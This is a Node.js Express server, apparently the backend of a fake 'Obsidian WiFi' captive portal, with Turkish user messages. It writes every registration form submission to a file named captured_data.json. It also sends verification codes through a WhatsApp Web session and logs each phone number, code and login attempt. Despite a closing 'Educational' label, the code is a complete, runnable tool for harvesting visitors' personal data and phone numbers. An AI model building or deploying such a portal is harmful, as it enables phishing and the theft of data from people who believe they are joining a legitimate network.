const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

// --- WhatsApp Client Initialization ---
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        args: ['--no-sandbox'],
    }
});

client.on('qr', (qr) => {
    console.log('--- WHATSAPP LOGIN REQUIRED ---');
    console.log('Lütfen aşağıdaki QR kodu WhatsApp uygulamanızdan okutun:');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    console.log('--- WHATSAPP CLIENT IS READY ---');
});

client.on('authenticated', () => {
    console.log('--- WHATSAPP AUTHENTICATED ---');
});

client.initialize();

// --- In-Memory Verification Codes ---
const verificationCodes = new Map(); // phone -> { code: '123456', expires: timestamp }

// Log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

const logFile = path.join(logDir, 'captured_data.json');

app.post('/api/register', (req, res) => {
    const userData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'REGISTRATION', ...userData };

    console.log('--- NEW REGISTRATION DATA ---');
    console.table(userData);

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'Kayıt başarılı. Giriş sayfasına yönlendiriliyorsunuz.',
        status: 'success'
    });
});

app.post('/api/request-code', async (req, res) => {
    let { phone } = req.body;
    const timestamp = new Date().toISOString();

    // Generate random 6-digit code
    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Store code with 5-minute expiry
    verificationCodes.set(phone, {
        code: generatedCode,
        expires: Date.now() + 5 * 60 * 1000
    });

    console.log(`--- CODE GENERATED FOR ${phone}: ${generatedCode} ---`);

    // WhatsApp Message Sending Logic
    try {
        // Format phone: Remove leading 0 and add 90 if needed
        let formattedPhone = phone.replace(/\D/g, ''); // only digits
        if (formattedPhone.startsWith('0')) {
            formattedPhone = '90' + formattedPhone.substring(1);
        } else if (!formattedPhone.startsWith('90')) {
            formattedPhone = '90' + formattedPhone;
        }
        
        const chatId = formattedPhone + "@c.us";
        const message = `*DOĞRULAMA KODU*\n\nObsidian WiFi ağına erişim için doğrulama kodunuz: *${generatedCode}*\n\nLütfen bu kodu giriş ekranına giriniz.`;

        await client.sendMessage(chatId, message);
        console.log(`--- MESSAGE SENT TO ${chatId} ---`);

        // Log request
        let logs = [];
        if (fs.existsSync(logFile)) {
            const fileContent = fs.readFileSync(logFile, 'utf-8');
            try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
        }
        logs.push({ timestamp, type: 'CODE_REQUEST', phone, sentCode: generatedCode });
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

        res.status(200).json({
            message: 'Doğrulama kodu WhatsApp üzerinden gönderildi.',
            status: 'success'
        });
    } catch (error) {
        console.error('WhatsApp Error:', error);
        res.status(500).json({
            message: 'Kod gönderilirken bir hata oluştu. Lütfen WhatsApp istemcisinin açık olduğundan emin olun.',
            status: 'error'
        });
    }
});

app.post('/api/login', (req, res) => {
    const { phone, smsCode } = req.body;
    const timestamp = new Date().toISOString();
    
    const storedData = verificationCodes.get(phone);
    const isValid = storedData && storedData.code === smsCode && Date.now() < storedData.expires;

    console.log(`--- LOGIN ATTEMPT: ${phone} | Code: ${smsCode} | Valid: ${isValid} ---`);

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push({ timestamp, type: 'LOGIN_ATTEMPT', phone, enteredCode: smsCode, success: isValid });
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    if (isValid) {
        verificationCodes.delete(phone); // Clear code after success
        res.status(200).json({
            message: 'Giriş başarılı. Sisteme yönlendiriliyorsunuz.',
            status: 'success'
        });
    } else {
        res.status(401).json({
            message: 'Geçersiz veya süresi dolmuş doğrulama kodu.',
            status: 'error'
        });
    }
});

app.listen(PORT, () => {
    console.log(`Educational Backend Server is running on http://localhost:${PORT}`);
});
